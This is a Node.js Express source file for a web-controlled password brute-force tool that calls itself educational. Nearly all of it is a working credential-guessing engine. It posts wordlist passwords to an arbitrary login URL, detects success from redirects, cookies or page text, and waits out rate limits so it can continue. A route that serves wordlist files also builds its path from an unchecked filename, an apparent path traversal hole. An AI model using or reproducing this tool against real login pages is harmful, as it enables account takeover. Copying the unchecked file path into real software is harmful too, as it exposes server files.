#!/usr/bin/env node
/**
 * Brute Force Web UI + API
 * Educational pentesting tool with real-time web interface
 *
 * Run: node brute-force-web.js
 * Open: http://localhost:3001
 */

const express = require('express');
const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');
const { URL } = require('url');

const app = express();
const PORT = 3001;

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(__dirname));

// Active attacks tracking
const activeAttacks = new Map();

// Brute force engine (same as CLI)
class BruteForcer {
  constructor(config) {
    this.config = config;
    this.stats = {
      startTime: Date.now(),
      attempted: 0,
      failed: 0,
      rateLimited: 0,
      errors: 0,
      found: null,
      totalPasswords: 0,
      currentPassword: '',
      status: 'running'
    };
    this.callbacks = [];
  }

  onProgress(callback) {
    this.callbacks.push(callback);
  }

  notifyProgress() {
    this.callbacks.forEach(cb => cb(this.stats));
  }

  async makeRequest(username, password) {
    return new Promise((resolve, reject) => {
      const targetUrl = new URL(this.config.target);
      const isHttps = targetUrl.protocol === 'https:';
      const httpModule = isHttps ? https : http;

      let postData = `user=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&btnSubmit=Submit`;

      const options = {
        hostname: targetUrl.hostname,
        port: targetUrl.port || (isHttps ? 443 : 80),
        path: targetUrl.pathname + targetUrl.search,
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'Content-Length': Buffer.byteLength(postData),
          'User-Agent': this.config.userAgent || 'Mozilla/5.0 (Educational Tool)',
        },
      };

      const req = httpModule.request(options, (res) => {
        let body = '';
        res.on('data', chunk => body += chunk);
        res.on('end', () => {
          resolve({
            status: res.statusCode,
            headers: res.headers,
            body: body
          });
        });
      });

      req.on('error', reject);
      req.write(postData);
      req.end();
    });
  }

  isSuccess(response) {
    if (response.status === 302) return true;
    if (response.headers['set-cookie']) return true;
    if (response.body.includes('Welcome') || response.body.includes('Dashboard')) return true;
    return false;
  }

  isRateLimited(response) {
    if (response.status === 429) return true;
    if (response.body.includes('Too Many') || response.body.includes('Rate Limit')) return true;
    return false;
  }

  async sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  async attemptLogin(username, password) {
    try {
      const response = await this.makeRequest(username, password);

      if (this.isRateLimited(response)) {
        this.stats.rateLimited++;
        await this.sleep(10000); // Wait 10s if rate limited
        return { success: false, rateLimited: true };
      }

      if (this.isSuccess(response)) {
        return { success: true, response };
      }

      return { success: false, response };
    } catch (err) {
      this.stats.errors++;
      return { success: false, error: err.message };
    }
  }

  async start(passwords) {
    this.stats.totalPasswords = passwords.length;

    for (let i = 0; i < passwords.length; i++) {
      const password = passwords[i].trim();
      this.stats.currentPassword = password;

      const result = await this.attemptLogin(this.config.username, password);
      this.stats.attempted++;

      if (result.success) {
        this.stats.found = { username: this.config.username, password };
        this.stats.status = 'success';
        this.notifyProgress();
        return;
      }

      if (!result.rateLimited) {
        this.stats.failed++;
      }

      this.notifyProgress();

      if (i < passwords.length - 1) {
        await this.sleep(this.config.delay || 1000);
      }
    }

    this.stats.status = 'completed';
    this.notifyProgress();
  }
}

// Routes
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'brute-force-ui.html'));
});

// Start attack
app.post('/api/attack/start', async (req, res) => {
  const { target, username, passwords, delay } = req.body;

  if (!target || !username || !passwords) {
    return res.status(400).json({ error: 'Missing required fields' });
  }

  const attackId = Date.now().toString();
  const passwordList = passwords.split('\n').filter(p => p.trim());

  const bruteForcer = new BruteForcer({
    target,
    username,
    delay: parseInt(delay) || 1000
  });

  activeAttacks.set(attackId, bruteForcer);

  // Start attack in background
  bruteForcer.start(passwordList).then(() => {
    console.log(`[*] Attack ${attackId} completed`);
  });

  res.json({ attackId, totalPasswords: passwordList.length });
});

// Get attack status
app.get('/api/attack/:id/status', (req, res) => {
  const attack = activeAttacks.get(req.params.id);

  if (!attack) {
    return res.status(404).json({ error: 'Attack not found' });
  }

  res.json(attack.stats);
});

// Stop attack
app.post('/api/attack/:id/stop', (req, res) => {
  const attack = activeAttacks.get(req.params.id);

  if (!attack) {
    return res.status(404).json({ error: 'Attack not found' });
  }

  attack.stats.status = 'stopped';
  activeAttacks.delete(req.params.id);

  res.json({ success: true });
});

// Load wordlist
app.get('/api/wordlists', (req, res) => {
  const wordlistsDir = path.join(__dirname, '../wordlists');
  const files = fs.readdirSync(wordlistsDir);

  res.json(files.map(file => ({
    name: file,
    path: `/api/wordlist/${file}`
  })));
});

// Get wordlist content
app.get('/api/wordlist/:filename', (req, res) => {
  const wordlistPath = path.join(__dirname, '../wordlists', req.params.filename);

  if (!fs.existsSync(wordlistPath)) {
    return res.status(404).json({ error: 'Wordlist not found' });
  }

  const content = fs.readFileSync(wordlistPath, 'utf8');
  res.send(content);
});

app.listen(PORT, () => {
  console.log('\n Brute Force Web UI (Educational)\n');
  console.log('='.repeat(50));
  console.log(`Server: http://localhost:${PORT}`);
  console.log(`Mock target: http://localhost:8080/login`);
  console.log('='.repeat(50));
  console.log('\n[WARNING]  For educational use only. Test on authorized systems only.\n');
});
